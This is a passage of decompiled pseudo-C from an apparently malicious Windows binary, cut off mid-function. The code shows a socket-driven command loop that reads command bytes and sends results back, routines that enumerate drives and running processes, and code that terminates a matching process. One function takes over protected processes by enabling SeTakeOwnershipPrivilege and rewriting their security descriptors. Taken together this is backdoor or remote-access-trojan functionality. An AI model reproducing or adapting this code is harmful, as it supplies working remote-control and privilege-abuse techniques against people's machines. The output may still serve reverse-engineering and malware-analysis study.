// Address range: 0x402aa7 - 0x402d8e
int32_t function_402aa7(void) {
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t v2 = g5; // 0x402ab1
    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x402ab7
    int32_t (*func)() = GetProcAddress(moduleHandle, "GetTickCount"); // 0x402ac5
    FreeLibrary(moduleHandle);
    memcpy(&g31->e0, (int32_t *)g32, (int32_t)g27);
    int32_t v3 = 0; // esi
    *(int32_t *)&g28 = *(int32_t *)&g27;
    g29 = g30;
    g26 = 0;
    g23 = NULL;
    __pseudo_call((int32_t)func);
    g33 = g30;
    int32_t v4 = *(int32_t *)(4 * (int32_t)g29 + (int32_t)&g8 - 260); // 0x402b2a
    __pseudo_branch(v4);
    g5 = 1;
    g23 = (char *)1;
    int32_t result; // 0x402c4f
    if (g24 != v3) {
        // 0x402c08
        g24 = v3;
        g6 = (int32_t)"&ha_j]?&";
        int32_t v5 = 90; // bp-260
        strlen("&ha_j]?&");
        int32_t str = 0; // bp-255
        strcpy((char *)&str, (char *)g6);
        int32_t len = strlen((char *)g6); // 0x402c37
        function_401f45((char *)&v5, len + 5);
        result = g5;
        // branch -> 0x402c4f
    } else {
        result = 1;
    }
    // 0x402c4f
    g5 = (int32_t)(struct _PROCESS_INFORMATION *)0x402b14;
    g6 = v2;
    g2 = v1;
    return result;
}

// Address range: 0x402d8f - 0x402ecd
int32_t function_402d8f(void) {
    // 0x402d8f
    g1 = 0x2004;
    function_405a10();
    g6 = g3;
    g3 = 0;
    g5 = 0x6832;
    g52 = 0;
    char v1 = 0; // bp-8200
    int32_t v2 = 0; // 0x402db0
    // branch -> 0x402db0
    while (true) {
        // 0x402db0
        int32_t v3; // 0x402e1b
        int32_t v4; // 0x402e23
        int32_t v5; // 0x402eb5
        if (g30 != (char)v2) {
            // 0x402db0
            v4 = v2;
            v3 = g6;
            // branch -> 0x402e15
          lab_0x402e15:;
            int32_t v6 = v3 - 5; // 0x402e1b
            g6 = v6;
            g30 = v1;
            g25 = v4;
            // branch -> 0x402e29
            while (true) {
                int32_t v7 = function_402f2f(&v1, v6); // 0x402e31
                g27 = (struct _WIN32_FIND_DATAA *)v7;
                if (v7 == -1) {
                    // 0x402ea7
                    g30 = g3;
                    v5 = g3;
                    // branch -> 0x402ead
                } else {
                    // 0x402e42
                    memcpy((int32_t *)g32, (int32_t *)&v1, v7);
                    int32_t v8 = g6 - (int32_t)g27; // 0x402e55
                    g6 = v8;
                    int32_t v9 = g3;
                    if ((struct _WIN32_FIND_DATAA *)v8 <= (struct _WIN32_FIND_DATAA *)g3) {
                        // 0x402e62
                        if ((int32_t)g23 == g3) {
                            Sleep(1);
                            while ((int32_t)g23 == g3) {
                                // 0x402e6a
                                Sleep(1);
                                // continue -> 0x402e6a
                            }
                            // 0x402e82
                            g54 = 1;
                            g26 = 1;
                            // branch -> 0x402e8c
                          lab_0x402e8c:
                            while (true) {
                                // 0x402e8c
                                Sleep(1);
                                if (g26 == g3) {
                                    // break -> 0x402e98
                                    break;
                                }
                                // continue -> 0x402e8c
                            }
                            int32_t v10 = g6; // 0x402e98
                            if ((struct _WIN32_FIND_DATAA *)v10 <= (struct _WIN32_FIND_DATAA *)g3) {
                                // break -> 0x402e9c
                                break;
                            }
                            v6 = v10;
                            // continue -> 0x402e29
                            continue;
                        } else {
                            v9 = 1;
                        }
                    }
                    // 0x402e82
                    g54 = v9;
                    g26 = 1;
                    // branch -> 0x402e8c
                    goto lab_0x402e8c;
                }
                // 0x402ead
                if (g52 == v5) {
                    // 0x402eb5
                    g66 = (struct _OVERLAPPED *)v5;
                    // branch -> 0x402ebb
                }
                // 0x402ebb
                g51 = 1;
                return 0;
            }
            // 0x402e9c
            g30 = g3;
            // branch -> 0x402db0
          lab_0x402db0_2:
            // 0x402db0
            v2 = g3;
            // branch -> 0x402db0
            continue;
        } else {
            // 0x402db8
            if (function_402ece() != 0) {
                // 0x402dc5
                if (function_402f2f(&v1, 5) != -1) {
                    // 0x402dde
                    int32_t v11;
                    g6 = v11;
                    if (v11 < 5) {
                        goto lab_0x402db0_2;
                    }
                    if (v1 != 90) {
                        // 0x402dfe
                        if (v1 != 81) {
                            // 0x402dfe
                            v4 = g3;
                            v3 = v11;
                            // branch -> 0x402e15
                            goto lab_0x402e15;
                        } else {
                            // 0x402e07
                            SetEvent((int32_t *)g20);
                            // branch -> 0x402db0
                            goto lab_0x402db0_2;
                        }
                      lab_0x402db0_3:
                        // 0x402db0
                        v2 = g3;
                        // branch -> 0x402db0
                        continue;
                    } else {
                        // 0x402df2
                        g24 = 1;
                        // branch -> 0x402db0
                        goto lab_0x402db0_3;
                    }
                }
            }
            // 0x402ead
            v5 = g3;
            // branch -> 0x402ead
        }
        // 0x402ead
        if (g52 == v5) {
            // 0x402eb5
            g66 = (struct _OVERLAPPED *)v5;
            // branch -> 0x402ebb
        }
        // 0x402ebb
        g51 = 1;
        return 0;
    }
}

// Address range: 0x402ece - 0x402f2e
int32_t function_402ece(void) {
    int32_t v1 = 0; // ebx
    // branch -> 0x402edc
    while (true) {
        char buf = 0; // bp-5
        uint32_t v2 = recv(*(int32_t *)&g34, &buf, 1, 0); // 0x402eea
        if (v2 == -1) {
            // 0x402ef5
            if (WSAGetLastError() == 0x2733) {
                goto lab_0x402f02_2;
            }
            // 0x402f24
            // branch -> 0x402f2b
            // 0x402f2b
            return 0;
        }
        // 0x402f08
        if (v2 >= 1) {
            if (buf != 13) {
                // 0x402f12
                if (buf != 10) {
                    // 0x402f18
                    v1 = 0;
                    // branch -> 0x402f02
                  lab_0x402f02:
                    // 0x402f02
                    Sleep(1);
                    // branch -> 0x402edc
                    continue;
                }
            }
            int32_t v3 = v1 + 1; // 0x402f1c
            v1 = v3;
            if (v3 < 4) {
                goto lab_0x402f02;
            }
            // 0x402f28
            // branch -> 0x402f2b
            // 0x402f2b
            return 1;
        }
      lab_0x402f02_2:
        // 0x402f02
        Sleep(1);
        // branch -> 0x402edc
    }
}

// Address range: 0x402f2f - 0x402f9a
int32_t function_402f2f(char * a1, int32_t result) {
    int32_t v1 = g5; // 0x402f31
    int32_t result2 = result; // edi
    int32_t v2 = 0; // esi
    int32_t v3 = 0; // ebx
    int32_t v4; // 0x402f4522
    if (result > 0x2000) {
        // 0x402f45
        result2 = 0x2000;
        v4 = 0x2000;
        // branch -> 0x402f49
    } else {
        // 0x402f45
        if (result < 1) {
            // 0x402f92
            g5 = v1;
            return result;
        }
        v4 = result;
    }
    int32_t v5 = 0; // 0x402f54
    int32_t v6 = v4; // 0x402f49
    // branch -> 0x402f49
    while (true) {
        int32_t sock = *(int32_t *)&g34; // 0x402f572
        int32_t v7 = recv(sock, (char *)(v5 + (int32_t)a1), v6 - v5, 0); // 0x402f5d
        if (v7 < 1) {
            // 0x402f67
            if (WSAGetLastError() != 0x2733) {
                // 0x402f96
                // branch -> 0x402f92
                // 0x402f92
                g5 = v1;
                return -1;
            }
            int32_t v8 = v3; // 0x402f74
            v3 = v8 + 1;
            int32_t v9 = v8 - 0x1770; // 0x402f77
            if (v9 == 0 || v9 < 0 != (0x176f - v8 & v8) < 0) {
                goto lab_0x402f84;
            }
            // 0x402f96
            // branch -> 0x402f92
            // 0x402f92
            g5 = v1;
            return -1;
        }
        // 0x402f80
        v2 += v7;
        v3 = 0;
        // branch -> 0x402f84
      lab_0x402f84:
        // 0x402f84
        Sleep(1);
        if (v2 >= result2) {
            // break -> 0x402f92
            break;
        }
        v5 = v2;
        v6 = result2;
        // continue -> 0x402f49
    }
    // 0x402f92
    g5 = v1;
    return result2;
}

// Address range: 0x402f9b - 0x4030c6
int32_t function_402f9b(void) {
    // 0x402f9b
    int32_t lpBuffer; // bp-1164
    int32_t str2 = &lpBuffer; // 0x402f9e
    int32_t v1 = g6; // 0x402fa8
    int32_t str = 0; // bp-647
    int32_t v2 = 65; // bp-652
    strcpy((char *)&str, (char *)&g64);
    int32_t len = strlen((char *)&g64); // 0x402fc3
    *(int32_t *)(len - 642 + g2) = (int32_t)g36;
    g6 = 10 + len;
    int32_t result; // 0x4030bd
    if (GetLogicalDriveStringsA(512, (char *)&lpBuffer) == 0 || (char)lpBuffer == 0) {
        // 0x4030af
        result = function_401f45((char *)&v2, g6);
        g6 = v1;
        return result;
    }
    int32_t v3 = 0;
    // branch -> 0x40300e
    while (true) {
        int32_t v4 = strlen((char *)str2) + 1; // 0x40301f
        int32_t v5 = v4; // ebx
        strcpy((char *)(g2 - 648 + g6), (char *)str2);
        int32_t v6 = v4 + g6; // esi
        int32_t driveType = GetDriveTypeA((char *)str2); // 0x40302b
        char lpVolumeNameBuffer; // bp-140
        int32_t len2; // 0x403079
        int32_t v7; // 0x403081
        int32_t v8; // 0x403098
        int32_t v9; // 0x40307e
        if (driveType == 2) {
          lab_0x403057:
            // 0x403057
            lpVolumeNameBuffer = 0;
            // branch -> 0x40305e
        } else {
            // 0x403039
            if (!GetVolumeInformationA((char *)str2, &lpVolumeNameBuffer, 128, NULL, NULL, NULL, NULL, 0)) {
                goto lab_0x403057;
            }
            // 0x40305e
            strcpy((char *)(g2 - 648 + v6), &lpVolumeNameBuffer);
            len2 = strlen(&lpVolumeNameBuffer);
            v9 = v5 + v3;
            v7 = len2 + 1 + v6;
            *(int32_t *)(v7 - 648 + g2) = driveType;
            g6 = v7 + 4;
            v8 = v9 - 1160 + g2;
            if (*(char *)v8 == 0) {
                // break -> 0x4030ad
                break;
            }
            str2 = v8;
            v3 = v9;
            // continue -> 0x40300e
            continue;
        }
        // 0x40305e
        strcpy((char *)(g2 - 648 + v6), &lpVolumeNameBuffer);
        len2 = strlen(&lpVolumeNameBuffer);
        v9 = v5 + v3;
        v7 = len2 + 1 + v6;
        *(int32_t *)(v7 - 648 + g2) = driveType;
        g6 = v7 + 4;
        v8 = v9 - 1160 + g2;
        if (*(char *)v8 == 0) {
            // break -> 0x4030ad
            break;
        }
        str2 = v8;
        v3 = v9;
        // continue -> 0x40300e
    }
    // 0x4030ad
    g5 = (int32_t)(char *)g5;
    // branch -> 0x4030af
    // 0x4030af
    result = function_401f45((char *)&v2, g6);
    g6 = v1;
    return result;
}

// Address range: 0x4030c7 - 0x40328c
int32_t function_4030c7(void) {
    // 0x4030c7
    char str2; // bp-1348
    int32_t v1 = &str2; // 0x4030ca
    g3 = 0;
    int32_t v2;
    char * v3; // bp-1368
    struct tagPROCESSENTRY32 * v4;
    char * v5; // bp-1376
    int32_t v6;
    int32_t v7; // bp-324
    int32_t str; // bp-833
    int32_t lpBuffer; // bp-836
    int32_t hLibModule;
    int32_t result; // 0x40328c
    int32_t * hObject; // 0x403189
    int32_t handleClosed; // 0x403278
    if (g62 == 2) {
        int32_t * moduleHandle = LoadLibraryA("psapi.dll"); // 0x4030ec
        int32_t hModule = (int32_t)moduleHandle; // 0x4030ec
        struct tagPROCESSENTRY32 * v8;
        if (hModule == g3) {
            // 0x403288
            g5 = (int32_t)v5;
            g6 = (int32_t)v8;
            g3 = (int32_t)v3;
            return hModule;
        }
        int32_t func = (int32_t)GetProcAddress(moduleHandle, "EnumProcessModules"); // 0x40310b
        int32_t func2 = (int32_t)GetProcAddress((int32_t *)hModule, "GetModuleFileNameExA"); // 0x403116
        int32_t v9 = g3; // 0x403118
        if (func == v9 || func2 == v9) {
            // 0x403288
            g5 = (int32_t)v5;
            g6 = (int32_t)v8;
            g3 = (int32_t)(char *)hModule;
            return func2;
        }
        v6 = func2;
        v2 = func;
        hLibModule = hModule;
        // 0x40312c
        g6 = 512;
        GetWindowsDirectoryA((char *)&lpBuffer, 512);
        strcpy((char *)&str, (char *)&g11);
        v5 = (char *)&lpBuffer;
        strcat((char *)&lpBuffer, (char *)&g12);
        strcat((char *)&lpBuffer, g13);
        strcat((char *)&lpBuffer, (char *)&g48);
        v3 = (char *)2;
        hObject = CreateToolhelp32Snapshot(2, g3);
        g5 = *(int32_t *)0x4060e0;
        v4 = (struct tagPROCESSENTRY32 *)&g12;
        if (hObject != (int32_t *)-1) {
            // 0x4031a0
            v7 = 296;
            *(int32_t *)&v5 = (int32_t)hObject;
            if (Process32First(hObject, (struct tagPROCESSENTRY32 *)&v7)) {
                // 0x4031bf
                // branch -> 0x4031bf
                while (true) {
                    // 0x4031bf
                    str2 = 0;
                    if (g62 != 2) {
                        goto lab_0x403218;
                    }
                    goto lab_0x4031cf;
                }
            } else {
                v4 = (struct tagPROCESSENTRY32 *)&v7;
            }
        }
        // 0x403275
        handleClosed = CloseHandle(hObject);
        if (hLibModule != g3) {
            // 0x40327f
            result = FreeLibrary((int32_t *)hLibModule);
            // branch -> 0x403288
        } else {
            result = handleClosed;
        }
        // 0x403288
        g5 = (int32_t)v5;
        g6 = (int32_t)v4;
        g3 = (int32_t)v3;
        return result;
    }
    // 0x4030c7
    v6 = 0;
    v2 = 0;
    hLibModule = 0;
    // branch -> 0x40312c
    // 0x40312c
    g6 = 512;
    lpBuffer = 0;
    GetWindowsDirectoryA((char *)&lpBuffer, 512);
    str = 0;
    strcpy((char *)&str, (char *)&g11);
    v5 = (char *)&lpBuffer;
    strcat((char *)&lpBuffer, (char *)&g12);
    strcat((char *)&lpBuffer, g13);
    strcat((char *)&lpBuffer, (char *)&g48);
    v3 = (char *)2;
    hObject = CreateToolhelp32Snapshot(2, g3);
    g5 = *(int32_t *)0x4060e0;
    v4 = (struct tagPROCESSENTRY32 *)&g12;
    if (hObject != (int32_t *)-1) {
        // 0x4031a0
        v7 = 296;
        *(int32_t *)&v5 = (int32_t)hObject;
        if (Process32First(hObject, (struct tagPROCESSENTRY32 *)&v7)) {
            int32_t str3 = 0; // bp-288
            // branch -> 0x4031bf
            while (true) {
                // 0x4031bf
                str2 = 0;
                char * v10;
                if (g62 != 2) {
                  lab_0x403218:
                    // 0x403218
                    strcpy(&str2, (char *)&str3);
                    // branch -> 0x40322d
                } else {
                  lab_0x4031cf:
                    // 0x4031cf
                    g3 = function_40338e((int32_t **)v10, 1040);
                    __pseudo_call(v2);
                    __pseudo_call(v6);
                    g1 = v1;
                    function_4034cb(&str2);
                    CloseHandle(&((struct tagPROCESSENTRY32 *)g3)->e0);
                    g3 = 0;
                    // branch -> 0x40322d
                }
                // 0x40322d
                if (lstrcmpiA(&str2, (char *)&lpBuffer) == 0) {
                    // 0x403259
                    if (g62 != 2) {
                        // 0x40326f
                        function_4038e7((int32_t)v10);
                        // branch -> 0x403274
                    } else {
                        // 0x403268
                        function_403887((int32_t *)v10);
                        // branch -> 0x403274
                    }
                    // 0x403274
                    // branch -> 0x403275
                } else {
                    // 0x403245
                    if (!Process32Next(hObject, (struct tagPROCESSENTRY32 *)&v7)) {
                        // break -> 0x403275
                        break;
                    }
                    // continue -> 0x4031bf
                    continue;
                }
                // 0x403275
                handleClosed = CloseHandle(hObject);
                if (hLibModule != g3) {
                    // 0x40327f
                    result = FreeLibrary((int32_t *)hLibModule);
                    // branch -> 0x403288
                } else {
                    result = handleClosed;
                }
                // 0x403288
                g5 = (int32_t)v5;
                g6 = (int32_t)(struct tagPROCESSENTRY32 *)&v7;
                g3 = (int32_t)v3;
                return result;
            }
            // 0x403275
            handleClosed = CloseHandle(hObject);
            if (hLibModule != g3) {
                // 0x40327f
                result = FreeLibrary((int32_t *)hLibModule);
                // branch -> 0x403288
            } else {
                result = handleClosed;
            }
            // 0x403288
            g5 = (int32_t)v5;
            g6 = (int32_t)(struct tagPROCESSENTRY32 *)&v7;
            g3 = (int32_t)v3;
            return result;
        }
        v4 = (struct tagPROCESSENTRY32 *)&v7;
    }
    // 0x403275
    handleClosed = CloseHandle(hObject);
    if (hLibModule != g3) {
        // 0x40327f
        result = FreeLibrary((int32_t *)hLibModule);
        // branch -> 0x403288
    } else {
        result = handleClosed;
    }
    // 0x403288
    g5 = (int32_t)v5;
    g6 = (int32_t)v4;
    g3 = (int32_t)v3;
    return result;
}

// Address range: 0x40328d - 0x403318
int32_t function_40328d(int32_t * a1, int32_t a2) {
    struct _ACL * v1 = (struct _ACL *)a2; // bp-48
    int32_t v2 = 0; // ebx
    struct _ACL * hMem = NULL;
    int32_t v3;
    int32_t result; // 0x403318
    if (SetEntriesInAclA(1, (struct _EXPLICIT_ACCESS_A *)&v1, NULL, &hMem) != 0) {
        result = 0;
        // branch -> 0x403316
    } else {
        int32_t v4 = *(int32_t *)&hMem; // 0x4032ee10
        int32_t * v5 = (int32_t *)v2; // 0x4032fa
        int32_t v6 = SetSecurityInfo(a1, 6, 4, v5, v5, (struct _ACL *)v4, (struct _ACL *)v2); // 0x4032fa
        LocalFree((int32_t *)*(int32_t *)&hMem);
        v3 = 6;
        result = v6 == v2;
        // branch -> 0x403316
    }
    // 0x403316
    g3 = v3;
    return result;
}

// Address range: 0x403319 - 0x403378
int32_t function_403319(int32_t * TokenHandle, int32_t lpName, int32_t PreviousState) {
    struct _TOKEN_PRIVILEGES * ReturnLength = (struct _TOKEN_PRIVILEGES *)lpName;
    int32_t v1 = g2; // bp-4
    int32_t NewState = 1; // bp-20
    int32_t lpLuid = 0; // bp-16
    if (!LookupPrivilegeValueA(NULL, (char *)lpName, (struct _LUID *)&lpLuid)) {
        // 0x403375
        g2 = v1;
        return 0;
    }
    // 0x403340
    ReturnLength = (struct _TOKEN_PRIVILEGES *)16;
    bool v2 = AdjustTokenPrivileges(TokenHandle, false, (struct _TOKEN_PRIVILEGES *)&NewState, 16, (struct _TOKEN_PRIVILEGES *)PreviousState, (int32_t *)&ReturnLength); // 0x403357
    if (!v2) {
        // 0x403375
        g2 = v1;
        return 0;
    }
    // 0x403361
    g2 = v1;
    return GetLastError() != 1300;
}

// Address range: 0x403379 - 0x40338d
int32_t function_403379(int32_t * TokenHandle, int32_t NewState) {
    // 0x403379
    return AdjustTokenPrivileges(TokenHandle, false, (struct _TOKEN_PRIVILEGES *)NewState, 0, NULL, NULL);
}

// Address range: 0x40338e - 0x4034ca
int32_t function_40338e(int32_t ** a1, int32_t dwDesiredAccess) {
    int32_t ** ReturnLength = a1;
    int32_t v1 = g3; // 0x403397
    int32_t v2 = g5; // 0x403399
    int32_t dwProcessId = (int32_t)a1;
    int32_t dwOptions2 = 0; // ebx
    int32_t * v3 = OpenProcess(dwDesiredAccess, false, dwProcessId); // 0x4033a9
    int32_t lpTargetHandle = (int32_t)v3; // bp-16
    if (v3 != NULL) {
        // 0x4034c3
        // branch -> 0x4034c6
        // 0x4034c6
        g5 = v2;
        g3 = v1;
        return lpTargetHandle;
    }
    int32_t v4 = (int32_t)OpenProcess(0x40000, false, dwProcessId); // 0x4033bf
    int32_t hSourceHandle = v4; // bp-8
    int32_t dwOptions; // 0x40349e
    int32_t result; // 0x4034ca
    bool v5; // 0x4034ad
    int32_t * processHandle2; // 0x4034aa
    int32_t * processHandle; // 0x4034a4
    if (v4 != dwOptions2) {
        // 0x403490
        function_40328d((int32_t *)v4, dwDesiredAccess);
        dwOptions = g3;
        processHandle = GetCurrentProcess();
        processHandle2 = GetCurrentProcess();
        v5 = DuplicateHandle(processHandle2, (int32_t *)hSourceHandle, processHandle, (int32_t **)&lpTargetHandle, dwDesiredAccess, (dwOptions & 1) != 0, dwOptions);
        if (!v5) {
            // 0x4034b7
            lpTargetHandle = g3;
            // branch -> 0x4034ba
        }
        // 0x4034ba
        CloseHandle((int32_t *)hSourceHandle);
        // branch -> 0x4034c3
        // 0x4034c3
        result = lpTargetHandle;
        // branch -> 0x4034c6
    } else {
        int32_t TokenHandle = 0; // bp-12
        int32_t * processHandle3 = GetCurrentProcess(); // 0x4033d8
        bool v6 = OpenProcessToken(processHandle3, 40, (int32_t **)&TokenHandle); // 0x4033db
        if (v6) {
            // 0x4033e9
            int32_t v7; // bp-32
            int32_t v8 = &v7; // 0x4033e9
            if (function_403319((int32_t *)TokenHandle, (int32_t)"SeTakeOwnershipPrivilege", v8) != 0) {
                int32_t hSourceHandle2 = (int32_t)OpenProcess(0x80000, (dwOptions2 & 1) != 0, dwProcessId); // 0x40340a
                if (hSourceHandle2 != dwOptions2) {
                    // 0x403412
                    ReturnLength = (int32_t **)512;
                    int32_t TokenInformation = 0; // bp-544
                    bool v9 = GetTokenInformation((int32_t *)TokenHandle, 1, &TokenInformation, 512, (int32_t *)&ReturnLength); // 0x40342b
                    if (!v9) {
                        // 0x403412
                        // branch -> 0x40346b
                    } else {
                        struct _ACL * v10 = (struct _ACL *)dwOptions2; // 0x403436
                        if (SetSecurityInfo((int32_t *)hSourceHandle2, 6, 1, (int32_t *)TokenInformation, (int32_t *)dwOptions2, v10, v10) == 0) {
                            int32_t * processHandle4 = GetCurrentProcess(); // 0x403457
                            int32_t * processHandle5 = GetCurrentProcess(); // 0x40345b
                            bool v11 = DuplicateHandle(processHandle5, (int32_t *)hSourceHandle2, processHandle4, (int32_t **)&hSourceHandle, 0x40000, (dwOptions2 & 1) != 0, dwOptions2); // 0x40345e
                            if (!v11) {
                                // 0x403468
                                hSourceHandle = dwOptions2;
                                // branch -> 0x40346b
                            }
                        }
                    }
                    // 0x40346b
                    CloseHandle((int32_t *)hSourceHandle2);
                    // branch -> 0x403472
                }
                // 0x403472
                function_403379((int32_t *)TokenHandle, v8);
                // branch -> 0x403480
            }
            // 0x403480
            CloseHandle((int32_t *)TokenHandle);
            int32_t v12 = hSourceHandle; // 0x403489
            if (v12 != dwOptions2) {
                // 0x403490
                function_40328d((int32_t *)v12, dwDesiredAccess);
                dwOptions = g3;
                processHandle = GetCurrentProcess();
                processHandle2 = GetCurrentProcess();
                v5 = DuplicateHandle(processHandle2, (int32_t *)hSourceHandle, processHandle, (int32_t **)&lpTargetHandle, dwDesiredAccess, (dwOptions & 1) != 0, dwOptions);
                if (!v5) {
                    // 0x4034b7
                    lpTargetHandle = g3;
                    // branch -> 0x4034ba
                }
                // 0x4034ba
                CloseHandle((int32_t *)hSourceHandle);
                // branch -> 0x4034c3
            }
            // 0x4034c3
            result = lpTargetHandle;
            // branch -> 0x4034c6
        } else {
            result = v6;
        }
    }
    // 0x4034c6
    g5 = v2;
    g3 = v1;
    return result;
}

// Address range: 0x4034cb - 0x403586
int32_t function_4034cb(char * str) {
    int32_t v1 = (int32_t)str; // 0x4034d5
    int32_t v2 = g5; // 0x4034d9
    if (str == NULL || *str == 0) {
        // 0x403582
        g5 = v2;
        return g1;
    }
    int32_t len = strlen("\\SystemRoot\\"); // 0x4034f1
    int32_t len2 = strlen("\\??\\"); // 0x4034ff
    if (_strnicmp(str, "\\SystemRoot\\", len) != 0) {
        int32_t v3 = _strnicmp(str, (char *)(int32_t)"\\??\\", len2); // 0x40356b
        g1 = v3;
        if (v3 == 0) {
            // 0x403574
            g1 = (int32_t)strcpy(str, (char *)(len2 + v1));
            // branch -> 0x403582
        }
        // 0x403582
        g5 = v2;
        return g1;
    }
    int32_t lpBuffer = 0; // bp-268
    int32_t v4 = GetWindowsDirectoryA((char *)&lpBuffer, 260); // 0x403527
    g1 = v4;
    if (v4 != 0) {
        // 0x403531
        strcat((char *)&lpBuffer, g13);
        strcat((char *)&lpBuffer, (char *)(len + v1));
        g1 = (int32_t)strcpy(str, (char *)&lpBuffer);
        // branch -> 0x403582
    }
    // 0x403582
    g5 = v2;
    return g1;
}

// Address range: 0x403587 - 0x403886
int32_t function_403587(void) {
    // 0x403587
    g1 = 0x2744;
    function_405a10();
    int32_t v1 = g6; // 0x403595
    g6 = 0;
    g3 = 5;
    char * v2 = (char *)67; // bp-10056
    int32_t v3 = 0; // bp-16
    int32_t v4; // bp-1096
    int32_t v5;
    int32_t v6; // bp-1608
    int32_t v7; // bp-1864
    struct tagPROCESSENTRY32 * c; // bp-24
    char * hObject; // bp-28
    int32_t v8; // bp-292
    int32_t v9; // bp-32
    int32_t v10; // bp-328
    int32_t v11; // bp-840
    struct tagPROCESSENTRY32 * v12;
    struct tagPROCESSENTRY32 * v13;
    int32_t v14;
    char * str;
    int32_t v15; // 0x403641
    int32_t v16; // 0x403662
    int32_t v17; // 0x4036da
    int32_t v18; // 0x403634
    int32_t * v19; // 0x403641
    int32_t * v20; // 0x403642
    int32_t v21;
    int32_t v22; // 0x403873
    int32_t v23; // 0x40362e
    int32_t v24; // 0x403635
    int32_t v25; // 0x40370e
    int32_t v26; // 0x4037a9
    int32_t v27; // 0x403801
    int32_t * v28; // 0x4035f3
    int32_t v29; // 0x4035f3
    int32_t v30; // 0x403864
    int32_t * v31; // 0x40364c
    int32_t v32; // 0x40364c
    int32_t * str2;
    if (g62 == 2) {
        int32_t * moduleHandle = LoadLibraryA((char *)67); // 0x4035ba
        int32_t v33 = (int32_t)moduleHandle; // 0x4035ba
        g5 = v33;
        if (v33 == g6) {
            // 0x40361b
            g3 = 5;
            v13 = (struct tagPROCESSENTRY32 *)moduleHandle;
            v5 = v1;
            // branch -> 0x40384f
            // 0x40384f
            if (v5 != -1) {
                // 0x403855
                *(int32_t *)(g7 - 4) = v5;
                CloseHandle((int32_t *)hObject);
                // branch -> 0x40385e
            }
            // 0x40385e
            if (v13 == NULL) {
                // 0x40385e
                v22 = g7;
                // branch -> 0x40386d
            } else {
                // 0x403864
                v30 = g7;
                *(int32_t *)(v30 - 4) = (int32_t)v13;
                FreeLibrary((int32_t *)hObject);
                v22 = v30;
                // branch -> 0x40386d
            }
            // 0x40386d
            *(int32_t *)(v22 - 4) = g3;
            *(int32_t *)(v22 - 8) = (int32_t)&v2;
            return function_401f45((char *)g3, (int32_t)&str2);
        }
        // 0x4035c9
        g6 = *(int32_t *)0x4060c8;
        c = (struct tagPROCESSENTRY32 *)moduleHandle;
        int32_t (*func)() = GetProcAddress(moduleHandle, "EnumProcessModules"); // 0x4035d5
        struct tagPROCESSENTRY32 * v34 = (struct tagPROCESSENTRY32 *)g5; // 0x4035dc
        c = v34;
        v3 = (int32_t)func;
        if (func == NULL || GetProcAddress(&v34->e0, "GetModuleFileNameExA") == NULL) {
            // 0x40361b
            g3 = 5;
            v13 = (struct tagPROCESSENTRY32 *)moduleHandle;
            v5 = v1;
            // branch -> 0x40384f
            // 0x40384f
            if (v5 != -1) {
                // 0x403855
                *(int32_t *)(g7 - 4) = v5;
                CloseHandle((int32_t *)hObject);
                // branch -> 0x40385e
            }
            // 0x40385e
            if (v13 == NULL) {
                // 0x40385e
                v22 = g7;
                // branch -> 0x40386d
            } else {
                // 0x403864
                v30 = g7;
                *(int32_t *)(v30 - 4) = (int32_t)v13;
                FreeLibrary((int32_t *)hObject);
                v22 = v30;
                // branch -> 0x40386d
            }
            // 0x40386d
            *(int32_t *)(v22 - 4) = g3;
            *(int32_t *)(v22 - 8) = (int32_t)&v2;
            return function_401f45((char *)g3, (int32_t)&str2);
        }
        v12 = (struct tagPROCESSENTRY32 *)moduleHandle;
        // 0x4035ef
        c = (struct tagPROCESSENTRY32 *)2;
        v28 = CreateToolhelp32Snapshot(2, 0);
        v29 = (int32_t)v28;
        if (v28 != (int32_t *)-1) {
            // 0x403600
            v10 = 296;
            hObject = (char *)&v10;
            v9 = v29;
            if (Process32First((int32_t *)296, (struct tagPROCESSENTRY32 *)&str2)) {
                // 0x403629
                g5 = 1040;
                v23 = &v8;
                v24 = &v11;
                v26 = &v6;
                v27 = &v4;
                v25 = &v7;
                // branch -> 0x40362e
                while (true) {
                    // 0x40362e
                    v18 = g7;
                    *(int32_t *)(v18 - 4) = v23;
                    *(int32_t *)(v18 - 8) = v24;
                    strcpy(str, (char *)&str2);
                    v15 = g7;
                    v19 = (int32_t *)v15;
                    v20 = (int32_t *)(v15 + 4);
                    *v20 = v14;
                    *v19 = 0;
                    *(int32_t *)(v15 - 4) = g5;
                    v31 = OpenProcess((int32_t)str, (bool)&str2, (int32_t)&str2);
                    v32 = (int32_t)v31;
                    g6 = v32;
                    *v20 = v32;
                    GetPriorityClass((int32_t *)str);
                    *v20 = g6;
                    CloseHandle((int32_t *)str);
                    v16 = g62;
                    if (v16 != 2) {
                        v21 = v15;
                        v17 = v16;
                        goto lab_0x4036da;
                    }
                    goto lab_0x40366b;
                }
            }
        }
        // 0x40361b
        g3 = 5;
        v13 = v12;
        v5 = v29;
        // branch -> 0x40384f
        // 0x40384f
        if (v5 != -1) {
            // 0x403855
            *(int32_t *)(g7 - 4) = v5;
            CloseHandle((int32_t *)hObject);
            // branch -> 0x40385e
        }
        // 0x40385e
        if (v13 == NULL) {
            // 0x40385e
            v22 = g7;
            // branch -> 0x40386d
        } else {
            // 0x403864
            v30 = g7;
            *(int32_t *)(v30 - 4) = (int32_t)v13;
            FreeLibrary((int32_t *)hObject);
            v22 = v30;
            // branch -> 0x40386d
        }
        // 0x40386d
        *(int32_t *)(v22 - 4) = g3;
        *(int32_t *)(v22 - 8) = (int32_t)&v2;
        return function_401f45((char *)g3, (int32_t)&str2);
    }
    // 0x403587
    v12 = NULL;
    // branch -> 0x4035ef
    // 0x4035ef
    c = (struct tagPROCESSENTRY32 *)2;
    v28 = CreateToolhelp32Snapshot(2, 0);
    v29 = (int32_t)v28;
    if (v28 != (int32_t *)-1) {
        // 0x403600
        v10 = 296;
        hObject = (char *)&v10;
        v9 = v29;
        if (Process32First((int32_t *)296, (struct tagPROCESSENTRY32 *)&str2)) {
            // 0x403629
            g5 = 1040;
            v23 = &v8;
            v24 = &v11;
            v26 = &v6;
            v27 = &v4;
            v25 = &v7;
            // branch -> 0x40362e
            while (true) {
                // 0x40362e
                v18 = g7;
                *(int32_t *)(v18 - 4) = v23;
                *(int32_t *)(v18 - 8) = v24;
                strcpy(str, (char *)&str2);
                v15 = g7;
                v19 = (int32_t *)v15;
                v20 = (int32_t *)(v15 + 4);
                *v20 = v14;
                *v19 = 0;
                *(int32_t *)(v15 - 4) = g5;
                v31 = OpenProcess((int32_t)str, (bool)&str2, (int32_t)&str2);
                v32 = (int32_t)v31;
